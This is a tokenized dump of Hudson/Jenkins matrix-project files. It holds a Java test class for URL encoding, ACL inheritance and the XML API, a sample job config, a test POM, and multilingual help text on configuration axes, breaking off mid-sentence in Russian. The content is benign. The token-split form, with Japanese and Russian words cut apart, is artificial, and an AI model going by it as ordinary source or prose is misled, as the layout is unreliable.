"SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "model", ".", "Item", ";", "import", "hudson", ".", "security", ".", "AuthorizationMatrixProperty", ";", "import", "hudson", ".", "security", ".", "ProjectMatrixAuthorizationStrategy", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "org", ".", "acegisecurity", ".", "context", ".", "SecurityContextHolder", ";", "import", "com", ".", "gargoylesoftware", ".", "htmlunit", ".", "xml", ".", "XmlPage", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "HudsonTestCase", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "Bug", ";", "/", "**", "*", "@", "author", "Alan", "Harder", "*", "/", "public", "class", "MatrixTest", "extends", "HudsonTestCase", "{", "/", "**", "*", "Test", "that", "spaces", "are", "encoded", "as", "%", "20", "for", "project", "name", ",", "axis", "name", "and", "axis", "value", ".", "*", "/", "public", "void", "testSpaceInUrl", "(", ")", "{", "MatrixProject", "mp", "=", "new", "MatrixProject", "(", "\"", "matrix", "test", "\"", ");", "MatrixConfiguration", "mc", "=", "new", "MatrixConfiguration", "(", "mp", ",", "Combination", ".", "fromString", "(", "\"", "foo", "bar", "=", "baz", "bat", "\"", "))", ";", "assertEquals", "(", "\"", "job", "/", "matrix", "%", "20test", "/", "\",", "mp", ".", "getUrl", "(", "))", ";", "assertEquals", "(", "\"", "job", "/", "matrix", "%", "20test", "/", "foo", "%", "20bar", "=", "baz", "%", "20bat", "/", "\",", "mc", ".", "getUrl", "(", "))", ";", "}", "/", "**", "*", "Test", "that", "project", "level", "permissions", "apply", "to", "child", "configurations", "as", "well", ".", "*", "/", "@", "Bug", "(", "9293", ")", "public", "void", "testConfigurationACL", "(", ")", "throws", "Exception", "{", "jenkins", ".", "setAuthorizationStrategy", "(", "new", "ProjectMatrixAuthorizationStrategy", "(", "))", ";", "MatrixProject", "mp", "=", "createMatrixProject", "(", ");", "mp", ".", "setAxes", "(", "new", "AxisList", "(", "new", "Axis", "(", "\"", "foo", "\"", ",", "\"", "a", "\"", ",", "\"", "b", "\"", "))", ");", "MatrixConfiguration", "mc", "=", "mp", ".", "getItem", "(", "\"", "foo", "=", "a", "\"", ");", "assertNotNull", "(", "mc", ")", ";", "SecurityContextHolder", ".", "clearContext", "(", ");", "assertFalse", "(", "mc", ".", "getACL", "(", ").", "hasPermission", "(", "Item", ".", "READ", ")", ");", "mp", ".", "addProperty", "(", "new", "AuthorizationMatrixProperty", "(", "Collections", ".", "singletonMap", "(", "Item", ".", "READ", ",", "Collections", ".", "singleton", "(", "\"", "anonymous", "\"", "))", "))", ";", "/", "/", "Project", "-", "level", "permission", "should", "apply", "to", "single", "configuration", "too", ":", "assertTrue", "(", "mc", ".", "getACL", "(", ").", "hasPermission", "(", "Item", ".", "READ", ")", ");", "}", "public", "void", "testApi", "(", ")", "throws", "Exception", "{", "MatrixProject", "project", "=", "createMatrixProject", "(", ");", "project", ".", "setAxes", "(", "new", "AxisList", "(", "new", "Axis", "(", "\"", "FOO", "\"", ",", "\"", "abc", "\"", ",", "\"", "def", "\"", "),", "new", "Axis", "(", "\"", "BAR", "\"", ",", "\"", "uvw", "\"", ",", "\"", "xyz", "\"", "))", ");", "XmlPage", "xml", "=", "new", "WebClient", "(", ").", "goToXml", "(", "project", ".", "getUrl", "(", ")", "+", "\"", "api", "/", "xml", "\"", ");", "assertEquals", "(", "4", ",", "xml", ".", "getByXPath", "(", "\"/", "/", "matrixProject", "/", "activeConfiguration", "\"", ").", "size", "(", "))", ";", "}", "}", "@", "@", "-", "1", "+", "0", ",", "0", "@", "@", "<", "hudson", "/", ">", "@", "@", "-", "1", ",", "19", "+", "0", ",", "0", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "matrix", "-", "project", ">", "<", "actions", "/", ">", "<", "description", ">", "</", "description", ">", "<", "keepDependencies", ">", "false", "<", "/", "keepDependencies", ">", "<", "properties", "/", ">", "<", "scm", "class", "=", "\"", "hudson", ".", "scm", ".", "NullSCM", "\"", "/>", "<", "canRoam", ">", "true", "<", "/", "canRoam", ">", "<", "disabled", ">", "false", "<", "/", "disabled", ">", "<", "blockBuildWhenDownstreamBuilding", ">", "false", "<", "/", "blockBuildWhenDownstreamBuilding", ">", "<", "blockBuildWhenUpstreamBuilding", ">", "false", "<", "/", "blockBuildWhenUpstreamBuilding", ">", "<", "triggers", "class", "=", "\"", "vector", "\"", "/>", "<", "concurrentBuild", ">", "false", "<", "/", "concurrentBuild", ">", "<", "axes", "/", ">", "<", "builders", "/", ">", "<", "publishers", "/", ">", "<", "buildWrappers", "/", ">", "<", "!-", "-", "somehow", "not", "here", ":", "<", "runSequentially", ">", "false", "<", "/", "runSequentially", ">", "-", "->", "<", "/", "matrix", "-", "project", ">", "<", "!", "The", "MIT", "License", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "THE", "SOFTWARE", ".", ">", "<", "!", "POM", "that", "echos", "back", "a", "few", "properties", ".", "Used", "by", "MatrixProjectTest", ">", "<", "project", "xmlns", "=", "\"", "http", ":", "//", "maven", ".", "apache", ".", "org", "/", "POM", "/", "4", ".", "0", ".", "0", "\"", "xmlns", ":", "xsi", "=", "\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "2001", "/", "XMLSchema", "-", "instance", "\"", "xsi", ":", "schemaLocation", "=", "\"", "http", ":", "//", "maven", ".", "apache", ".", "org", "/", "POM", "/", "4", ".", "0", ".", "0", "http", ":", "//", "maven", ".", "apache", ".", "org", "/", "maven", "-", "v4_0_0", ".", "xsd", "\"", ">", "<", "modelVersion", ">", "4", ".", "0", ".", "0", "<", "/", "modelVersion", ">", "<", "groupId", ">", "test", "<", "/", "groupId", ">", "<", "artifactId", ">", "test", "<", "/", "artifactId", ">", "<", "version", ">", "0", ".", "1", "-", "SNAPSHOT", "<", "/", "version", ">", "<", "build", ">", "<", "plugins", ">", "<", "plugin", ">", "<", "groupId", ">", "org", ".", "jvnet", ".", "maven", "-", "antrun", "-", "extended", "-", "plugin", "<", "/", "groupId", ">", "<", "artifactId", ">", "maven", "-", "antrun", "-", "extended", "-", "plugin", "<", "/", "artifactId", ">", "<", "version", ">", "1", ".", "40", "<", "/", "version", ">", "<", "executions", ">", "<", "execution", ">", "<", "phase", ">", "validate", "<", "/", "phase", ">", "<", "configuration", ">", "<", "tasks", ">", "<", "echo", ">", "assertion", "$", "{", "prop", "}", "=$", "{", "db", "}", "</", "echo", ">", "<", "/", "tasks", ">", "<", "/", "configuration", ">", "<", "goals", ">", "<", "goal", ">", "run", "<", "/", "goal", ">", "<", "/", "goals", ">", "<", "/", "execution", ">", "<", "/", "executions", ">", "<", "/", "plugin", ">", "<", "/", "plugins", ">", "<", "/", "build", ">", "<", "pluginRepositories", ">", "<", "pluginRepository", ">", "<", "id", ">", "m", ".", "g", ".", "o", "-", "public", "<", "/", "id", ">", "<", "url", ">", "http", ":", "//", "maven", ".", "glassfish", ".", "org", "/", "content", "/", "groups", "/", "public", "/", "</", "url", ">", "<", "releases", ">", "<", "enabled", ">", "true", "<", "/", "enabled", ">", "<", "/", "releases", ">", "<", "snapshots", ">", "<", "enabled", ">", "false", "<", "/", "enabled", ">", "<", "/", "snapshots", ">", "<", "/", "pluginRepository", ">", "<", "/", "pluginRepositories", ">", "<", "/", "project", ">", "<", "div", ">", "If", "your", "configuration", "matrix", "needs", "additional", "axes", ",", "you", "can", "specify", "them", "here", ".", "<", "p", ">", "For", "example", ",", "let", "'", "s", "say", "you", "are", "trying", "to", "run", "a", "test", "for", "your", "database", "application", ",", "and", "you", "need", "to", "test", "it", "with", "three", "databases", ":", "MySQL", ",", "PostgreSQL", ",", "and", "Oracle", ".", "Your", "build", "script", "is", "designed", "so", "that", "you", "can", "test", "with", "a", "particular", "database", "by", "doing", "<", "tt", ">", "ant", "-", "Ddatabase", "=", "mysql", "<", "/", "tt", ">", ".", "<", "p", ">", "This", "is", "the", "concept", "of", "an", "axis", ".", "You", "can", "have", "a", "variable", "called", "\"", "database", "\"", ",", "which", "takes", "three", "values", ".", "When", "you", "configure", "it", ",", "Jenkins", "will", "run", "3", "builds", ",", "each", "with", "different", "values", "assigned", "to", "the", "\"", "database", "\"", "variable", "to", "exhaustively", "cover", "the", "configuration", "matrix", ".", "<", "p", ">", "Variables", "specified", "here", "are", "made", "available", "to", "the", "build", "as", "environment", "variables", ".", "In", "addition", ",", "for", "Ant", "and", "Maven", ",", "variables", "are", "also", "exposed", "as", "properties", ",", "as", "if", "<", "tt", ">", "-", "D", "<", "i", ">", "variableName", "<", "/", "i", ">", "=<", "i", ">", "value", "<", "/", "i", ">", "</", "tt", ">", "are", "specified", "on", "the", "command", "line", ".", "<", "p", ">", "When", "multiple", "axes", "are", "specified", ",", "all", "of", "the", "possible", "combinations", "of", "axes", "are", "built", "exhaustively", ".", "Multiple", "values", "in", "labels", "and", "JDKs", "are", "treated", "in", "the", "same", "way", ".", "So", "if", "you", "specify", "jdk", "=", "[", "JDK5", ",", "JDK6", "]", ",", "database", "=", "[", "mysql", ",", "postgresql", ",", "oracle", "]", ",", "container", "=", "[", "jetty", ",", "tomcat", "]", ",", "then", "each", "build", "will", "consists", "of", "2x3x2", "=", "12", "different", "sub", "-", "builds", ".", "<", "/", "div", ">", "<", "div", ">", "Hier", "k", "\u00f6", "nnen", "Sie", "die", "Achsen", "Ihrer", "Konfigurationsmatrix", "angeben", ".", "<", "p", ">", "Beispiel", ":", "Sie", "haben", "eine", "Datenbankanwendung", "geschrieben", "und", "m", "\u00f6", "chten", "diese", "mit", "den", "drei", "Datenbanksystemen", "MySQL", ",", "PostgreSQL", "und", "Oracle", "testen", ".", "Ihr", "Build", "-", "Skript", "ist", "so", "gestaltet", ",", "dass", "Sie", "ein", "bestimmtes", "Datenbanksystem", "testen", "k", "\u00f6", "nnen", ",", "indem", "Sie", "Ant", "etwa", "folgenderma", "\u00df", "en", "aufrufen", ":", "<", "tt", ">", "ant", "-", "Ddatabase", "=", "mysql", "<", "/", "tt", ">", ".", "<", "p", ">", "Dies", "ist", "das", "Konzept", "einer", "\"", "Achse", "\"", ".", "Sie", "definieren", "dazu", "eine", "Variable", "namens", "\"", "database", "\"", ",", "welche", "unterschiedliche", "Werte", "annehmen", "kann", ".", "Wenn", "Sie", "f", "\u00fc", "r", "diese", "Variable", "3", "Werte", "konfigurieren", ",", "wird", "Jenkins", "3", "Unter", "-", "Builds", "ausf", "\u00fc", "hren", "-", "jeder", "mit", "einem", "anderen", "Wert", "f", "\u00fc", "r", "die", "Variable", "\"", "database", "\"", ",", "um", "die", "Konfigurationsmatrix", "ersch", "\u00f6", "pfend", "abzudecken", ".", "<", "p", ">", "Variablen", ",", "die", "hier", "als", "Achse", "spezifiziert", "werden", ",", "stehen", "dem", "Build", "als", "Umgebungsvariablen", "zur", "Verf", "\u00fc", "gung", ".", "F", "\u00fc", "r", "Ant", "und", "Maven", "sind", "die", "Variablen", "zus", "\u00e4", "tzlich", "auch", "als", "Eigenschaften", "(", "properties", ")", "sichtbar", "-", "genau", "so", ",", "als", "ob", "<", "tt", ">", "-", "D", "<", "i", ">", "variableName", "<", "/", "i", ">", "=<", "i", ">", "value", "<", "/", "i", ">", "</", "tt", ">", "in", "der", "Kommandozeile", "angegeben", "worden", "w", "\u00e4", "re", ".", "<", "p", ">", "Sind", "mehrere", "Achsen", "eingerichtet", ",", "so", "werden", "alle", "m", "\u00f6", "glichen", "Kombinationen", "ersch", "\u00f6", "pfend", "in", "Unter", "-", "Builds", "ausgef", "\u00fc", "hrt", ".", "Mehrfache", "Auswahlen", "in", "Labels", "und", "JDKs", "werden", "auf", "dieselbe", "Weise", "behandelt", ".", "Geben", "Sie", "beispielsweise", "<", "tt", ">", "jdk", "=", "[", "JDK5", ",", "JDK6", "]", ",", "database", "=", "[", "mysql", ",", "postgresql", ",", "oracle", "]", ",", "container", "=", "[", "jetty", ",", "tomcat", "]", "</", "tt", ">", "an", ",", "so", "besteht", "ein", "Build", "aus", "2x3x2", "=", "12", "unterschiedlichen", "Unter", "-", "Builds", ".", "<", "/", "div", ">", "\ufeff", "<", "div", ">", "Si", "votre", "matrice", "de", "configuration", "a", "besoin", "d", "'", "axes", "suppl", "\u00e9", "mentaires", ",", "vous", "pouvez", "les", "sp", "\u00e9", "cifiez", "ici", ".", "<", "p", ">", "Par", "exemple", ",", "supposons", "que", "vous", "voulez", "lancer", "un", "test", "pour", "une", "application", "de", "base", "de", "donn", "\u00e9", "es", "et", "que", "vous", "devez", "la", "tester", "avec", "trois", "bases", "&", "nbsp", ";", ":", "MySQL", ",", "PostgreSQL", "et", "Oracle", ".", "Votre", "script", "de", "build", "est", "con", "\u00e7", "u", "de", "fa", "\u00e7", "on", "\u00e0", "sp", "\u00e9", "cifier", "la", "base", "\u00e0", "tester", "ainsi", "&", "nbsp", ";", ":", "<", "tt", ">", "ant", "-", "Ddatabase", "=", "mysql", "<", "/", "tt", ">", ".", "<", "p", ">", "Un", "axe", ",", "c", "'", "est", "\u00e7", "a", ".", "Vous", "pouvez", "avoir", "une", "variable", "\"", "database", "\"", ",", "qui", "prend", "trois", "valeurs", "possibles", ".", "Quand", "vous", "configurez", "l", "'", "axe", ",", "Jenkins", "lancera", "3", "builds", ",", "avec", "les", "3", "valeurs", "possibles", "assign", "\u00e9", "es", "\u00e0", "la", "variable", "\"", "database", "\"", "afin", "de", "couvrir", "toutes", "combinaisons", "de", "configurations", "possibles", "(", "la", "matrice", "des", "configurations", ")", ".", "<", "p", ">", "Les", "variables", "sp", "\u00e9", "cifi", "\u00e9", "es", "ici", "sont", "disponibles", "pour", "le", "build", "comme", "variables", "d", "'", "environnement", ".", "De", "plus", ",", "pour", "Ant", "et", "Maven", ",", "les", "variables", "sont", "\u00e9", "galement", "expos", "\u00e9", "es", "en", "tant", "que", "propri", "\u00e9", "t", "\u00e9", "s", ",", "comme", "si", "elles", "\u00e9", "taient", "pass", "\u00e9", "es", "avec", "<", "tt", ">", "-", "D", "<", "i", ">", "nomVariable", "<", "/", "i", ">", "=<", "i", ">", "valeur", "<", "/", "i", ">", "</", "tt", ">", "en", "ligne", "de", "commande", ".", "<", "p", ">", "Quand", "plusieurs", "axes", "sont", "sp", "\u00e9", "cifi", "\u00e9", "s", ",", "toutes", "les", "combinaisons", "d", "'", "axe", "possibles", "sont", "construites", "de", "fa", "\u00e7", "on", "exhaustive", ".", "Les", "valeurs", "multiples", "pour", "les", "labels", "et", "les", "JDKs", "sont", "trait", "\u00e9", "es", "de", "la", "m", "\u00ea", "me", "fa", "\u00e7", "on", ".", "Par", "exemple", ",", "si", "vous", "sp", "\u00e9", "cifiez", "jdk", "=", "[", "JDK5", ",", "JDK6", "]", ",", "database", "=", "[", "mysql", ",", "postgresql", ",", "oracle", "]", ",", "container", "=", "[", "jetty", ",", "tomcat", "]", ",", "alors", "chaque", "build", "exhaustif", "consistera", "en", "2x3x2", "=", "12", "sous", "-", "builds", "diff", "\u00e9", "rents", ".", "<", "/", "div", ">", "<", "div", ">", "\u69cb", "\u6210\u8ef8", "\u3092\u8ffd", "\u52a0\u3059", "\u308b\u5fc5", "\u8981\u304c", "\u3042\u308c", "\u3070\u3001", "\u3053\u3053", "\u3067\u6307", "\u5b9a\u3057", "\u307e\u3059", "\u3002", "<", "p", ">", "\u4f8b", "\u3048\u3070", "\u3001\u30c7", "\u30fc\u30bf", "\u30d9\u30fc", "\u30b9\u30a2", "\u30d7\u30ea", "\u30b1\u30fc", "\u30b7\u30e7", "\u30f3\u306e", "\u30c6\u30b9", "\u30c8\u3092", "\u5b9f\u884c", "\u3057\u3001", "MySQL", "\u3001", "PostgreSQL", "\u304a", "\u3088\u3073", "Oracle", "\u306e", "3", "\u3064", "\u306e\u30c7", "\u30fc\u30bf", "\u30d9\u30fc", "\u30b9\u3067", "\u30c6\u30b9", "\u30c8\u3059", "\u308b\u5fc5", "\u8981\u304c", "\u3042\u308b", "\u3068\u3057", "\u307e\u3057", "\u3087\u3046", "\u3002", "<", "tt", ">", "ant", "-", "Ddatabase", "=", "mysql", "<", "/", "tt", ">", "\u3092\u5b9f", "\u884c\u3057", "\u3066\u7279", "\u5b9a\u306e", "\u30c7\u30fc", "\u30bf\u30d9", "\u30fc\u30b9", "\u3067\u30c6", "\u30b9\u30c8", "\u3067\u304d", "\u308b\u3088", "\u3046\u306b", "\u3001", "\u30d3", "\u30eb\u30c9", "\u30b9\u30af", "\u30ea\u30d7", "\u30c8\u304c", "\u30c7\u30b6", "\u30a4\u30f3", "\u3055\u308c", "\u3066\u3044", "\u307e\u3059", "\u3002", "<", "p", ">", "\u3053", "\u308c\u304c", "\u3001\u69cb", "\u6210\u8ef8", "\u306e\u30b3", "\u30f3\u30bb", "\u30d7\u30c8", "\u3067\u3059", "\u3002\"", "database", "\"", "\u3068\u3044", "\u3046\u5909", "\u6570\u3092", "\u4f7f\u7528", "\u3057\u3001", "\u305d\u306e", "\u5909\u6570", "\u306f", "3", "\u3064", "\u306e\u5024", "\u3092\u3068", "\u308a\u307e", "\u3059\u3002", "\u69cb", "\u6210\u8ef8", "\u3092\u8a2d", "\u5b9a\u3059", "\u308b\u3068", "\u3001", "Jenkins", "\u306f", "3", "\u3064", "\u306e\u30d3", "\u30eb\u30c9", "\u3092\u8d77", "\u52d5\u3057", "\u307e\u3059", "\u3002\u305d", "\u308c\u305e", "\u308c\u306e", "\u30d3\u30eb", "\u30c9\u306f", "\u3001\u69cb", "\u6210\u30de", "\u30c8\u30ea", "\u30c3\u30af", "\u30b9\u3092", "\u5168\u3066", "\u30ab\u30d0", "\u30fc\u3059", "\u308b\u3088", "\u3046\u306b", "\u3001", "\"", "database", "\"", "\u5909\u6570", "\u306b\u7570", "\u306a\u308b", "\u5024\u304c", "\u5272\u308a", "\u5f53\u3066", "\u3089\u308c", "\u307e\u3059", "\u3002", "<", "p", ">", "\u3053", "\u3053\u3067", "\u6307\u5b9a", "\u3057\u305f", "\u5909\u6570", "\u306f\u3001", "\u74b0\u5883", "\u5909\u6570", "\u3068\u3057", "\u3066\u30d3", "\u30eb\u30c9", "\u3067\u5229", "\u7528\u3067", "\u304d\u307e", "\u3059\u3002", "\u3055\u3089", "\u306b\u3001", "\u30b3", "\u30de\u30f3", "\u30c9\u30e9", "\u30a4\u30f3", "\u3067<", "tt", ">", "-", "D", "<", "i", ">", "variableName", "<", "/", "i", ">", "=<", "i", ">", "value", "<", "/", "i", ">", "</", "tt", ">", "\u3068\u6307", "\u5b9a\u3057", "\u305f\u306e", "\u3068\u540c", "\u69d8\u306b", "\u3001", "Ant", "\u3084", "Maven", "\u3067", "\u30d7\u30ed", "\u30d1\u30c6", "\u30a3\u3067", "\u3082\u5229", "\u7528\u3067", "\u304d\u307e", "\u3059\u3002", "<", "p", ">", "\u8907", "\u6570\u306e", "\u8ef8\u304c", "\u6307\u5b9a", "\u3055\u308c", "\u3066\u3044", "\u308b\u5834", "\u5408\u3001", "\u8ef8\u306e", "\u53d6\u308a", "\u5f97\u308b", "\u5168\u3066", "\u306e\u7d44", "\u307f\u5408", "\u308f\u305b", "\u304c\u7d44", "\u307f\u7acb", "\u3066\u3089", "\u308c\u307e", "\u3059\u3002", "\u30e9", "\u30d9\u30eb", "\u3084", "JDK", "\u306b", "\u8907\u6570", "\u306e\u5024", "\u3092\u8a2d", "\u5b9a\u3057", "\u305f\u5834", "\u5408\u3082", "\u540c\u69d8", "\u306b\u6271", "\u308f\u308c", "\u307e\u3059", "\u3002\u3064", "\u307e\u308a", "\u3001", "jdk", "=", "[", "JDK5", ",", "JDK6", "]", "\u3001", "database", "=", "[", "mysql", ",", "postgresql", ",", "oracle", "]", "\u304a\u3088", "\u3073", "container", "=", "[", "jetty", ",", "tomcat", "]", "\u3068\u6307", "\u5b9a\u3057", "\u305f\u5834", "\u5408\u3001", "\u5404", "\u30d3\u30eb", "\u30c9\u306f", "\u3001", "2x3x2", "=", "12", "\u500b", "\u306e\u7570", "\u306a\u308b", "\u30b5\u30d6", "\u30d3\u30eb", "\u30c9\u3067", "\u69cb\u6210", "\u3055\u308c", "\u307e\u3059", "\u3002", "<", "/", "div", ">", "<", "div", ">", "Indien", "uw", "configuratiematrix", "extra", "dimensies", "benodigd", ",", "kunt", "U", "die", "hier", "opgeven", ".", "<", "p", ">", "Stel", "dat", "U", "uw", "databankapplicatie", "wenst", "te", "testen", "t", ".", "o", ".", "v", ".", "3", "databanken", ":", "MySQL", ",", "PostgreSQL", ",", "en", "Oracle", ".", "U", "hebt", "uw", "bouwspecifcatie", "zo", "ontworpen", "dat", "U", ",", "door", "het", "opgeven", "van", "een", "optie", ",", "kunt", "kiezen", "t", ".", "o", ".", "v", ".", "welk", "systeem", "U", "wenst", "te", "testen", ",", "bvb", ".", "<", "tt", ">", "ant", "-", "Ddatabank", "=", "mysql", "<", "/", "tt", ">", ".", "<", "p", ">", "Dit", "is", "het", "concept", "van", "een", "matrixdimensie", ".", "U", "kunt", "een", "variabele", "\"", "databank", "\"", "hebben", ",", "met", "drie", "waarden", ".", "Zo", "geconfigureerd", ",", "zal", "Jenkins", "3", "bouwpogingen", "lanceren", ",", "elk", "met", "een", "andere", "waarde", "voor", "die", "parameter", ".", "Op", "die", "manier", "worden", "alle", "mogelijkheden", "in", "de", "matrix", "afgetoetst", ".", "<", "p", ">", "De", "hier", "gedefinieerde", "variabelen", "worden", "als", "omgevingsparameters", "beschikbaar", "gesteld", "aan", "uw", "bouwpogingen", ".", "Meer", "nog", ",", "in", "het", "geval", "U", "Ant", "of", "Maven", "gebruikt", ",", "zullen", "de", "variabelen", "ook", "als", "parameters", "beschikbaar", "gesteld", "worden", ",", "alsof", "<", "tt", ">", "-", "D", "<", "i", ">", "parameterNaam", "<", "/", "i", ">", "=<", "i", ">", "waarde", "<", "/", "i", ">", "</", "tt", ">", "op", "de", "commandolijn", "meegegeven", "werd", ".", "<", "p", ">", "Indien", "U", "meerdere", "dimensies", "opgeeft", ",", "zullen", "alle", "mogelijke", "combinaties", "afgetoetst", "worden", ".", "Meerdere", "waarden", "in", "labels", "en", "JDKs", "worden", "op", "dezelfde", "manier", "behandeld", ".", "Indien", "U", "dus", "jdk", "=", "[", "JDK5", ",", "JDK6", "]", ",", "database", "=", "[", "mysql", ",", "postgresql", ",", "oracle", "]", ",", "container", "=", "[", "jetty", ",", "tomcat", "]", "opgeeft", ",", "zal", "een", "bouwpoging", "feitelijk", "2x3x2", "=", "12", "verschillende", "bouwpogingen", "omvatten", ".", "<", "/", "div", ">", "<", "div", ">", "Se", "sua", "matriz", "de", "configura", "&", "#", "231", ";", "&#", "227", ";", "o", "precisa", "de", "eixos", "adicionais", ",", "voc", "&", "#", "234", ";", "pode", "especific", "&", "#", "225", ";", "-", "los", "aqui", ".", "<", "p", ">", "Por", "exemplo", ",", "vamos", "dizer", "que", "voc", "&", "#", "234", ";", "est", "&", "#", "225", ";", "tentando", "executar", "um", "teste", "para", "sua", "aplica", "&", "#", "231", ";", "&#", "227", ";", "o", "de", "banco", "de", "dados", ",", "e", "voc", "&", "#", "234", ";", "precisa", "test", "&", "#", "225", ";", "-", "la", "com", "tr", "&", "#", "234", ";", "s", "bancos", "de", "dados", ":", "MySQL", ",", "PostgreSQL", ",", "e", "Oracle", ".", "Seu", "script", "de", "constru", "&", "#", "231", ";", "&#", "227", ";", "o", "est", "&", "#", "225", ";", "projetado", "tal", "que", "voc", "&", "#", "234", ";", "possa", "testar", "com", "um", "banco", "de", "dados", "particular", "usando", "<", "tt", ">", "ant", "-", "Ddatabase", "=", "mysql", "<", "/", "tt", ">", ".", "<", "p", ">", "Este", "&", "#", "233", ";", "o", "conceito", "de", "um", "eixo", ".", "Voc", "&", "#", "234", ";", "pode", "ter", "uma", "vari", "&", "#", "225", ";", "vel", "chamada", "\"", "database", "\"", ",", "que", "recebe", "tr", "&", "#", "234", ";", "s", "valores", ".", "Quando", "voc", "&", "#", "234", ";", "configur", "&", "#", "225", ";", "-", "la", ",", "Jenkins", "executar", "&", "#", "225", ";", "3", "constru", "&", "#", "231", ";", "&#", "245", ";", "es", ",", "cada", "uma", "com", "valores", "diferentes", "para", "a", "vari", "&", "#", "225", ";", "vel", "\"", "database", "\"", "para", "exaustivamente", "cobrir", "a", "matriz", "de", "configura", "&", "#", "231", ";", "&#", "227", ";", "o", ".", "<", "p", ">", "Vari", "&", "#", "225", ";", "veis", "especificadas", "aqui", "se", "tornam", "dispon", "&", "#", "237", ";", "veis", "para", "a", "constru", "&", "#", "231", ";", "&#", "227", ";", "o", "como", "vari", "&", "#", "225", ";", "veis", "de", "ambiente", ".", "Em", "adi", "&", "#", "231", ";", "&#", "227", ";", "o", ",", "para", "Ant", "e", "Maven", ",", "as", "vari", "&", "#", "225", ";", "veis", "tamb", "&", "#", "233", ";", "m", "s", "&", "#", "227", ";", "o", "expostas", "como", "propriedades", ",", "como", "se", "<", "tt", ">", "-", "D", "<", "i", ">", "nomeDaVariavel", "<", "/", "i", ">", "=<", "i", ">", "valor", "<", "/", "i", ">", "</", "tt", ">", "fossem", "especificadas", "na", "linha", "de", "comando", ".", "<", "p", ">", "Quando", "m", "&", "#", "250", ";", "ltiplos", "eixos", "s", "&", "#", "227", ";", "o", "especificados", ",", "todas", "as", "poss", "&", "#", "237", ";", "veis", "combina", "&", "#", "231", ";", "&#", "245", ";", "es", "dos", "eixos", "s", "&", "#", "227", ";", "o", "constru", "&", "#", "237", ";", "das", "exaustivamente", ".", "Valores", "m", "&", "#", "250", ";", "ltiplos", "em", "labels", "e", "JDKs", "s", "&", "#", "227", ";", "o", "tratados", "da", "mesma", "maneira", ".", "Assim", "se", "voc", "&", "#", "234", ";", "especificar", "jdk", "=", "[", "JDK5", ",", "JDK6", "]", ",", "database", "=", "[", "mysql", ",", "postgresql", ",", "oracle", "]", ",", "container", "=", "[", "jetty", ",", "tomcat", "]", ",", "ent", "&", "#", "227", ";", "o", "cada", "constru", "&", "#", "231", ";", "&#", "227", ";", "o", "consistir", "&", "#", "225", ";", "de", "2x3x2", "=", "12", "diferentes", "sub", "-", "constru", "&", "#", "231", ";", "&#", "245", ";", "es", ".", "<", "/", "div", ">", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "\ufeff", "<", "div", ">", "\u0415", "\u0441\u043b", "\u0438", "\u0432", "\u0430\u0448", "\u0430", "\u043a", "\u043e\u043d", "\u0444\u0438", "\u0433\u0443", "\u0440\u0430", "\u0446\u0438", "\u043e\u043d", "\u043d\u0430", "\u044f", "\u043c", "\u0430\u0442", "\u0440\u0438", "\u0446\u0430", "\u043d", "\u0443\u0436", "\u0434\u0430", "\u0435\u0442", "\u0441\u044f", "\u0432", "\u0434", "\u043e\u043f", "\u043e\u043b", "\u043d\u0438", "\u0442\u0435", "\u043b\u044c", "\u043d\u044b", "\u0445", "\u043e", "\u0441\u044f", "\u0445", "(", 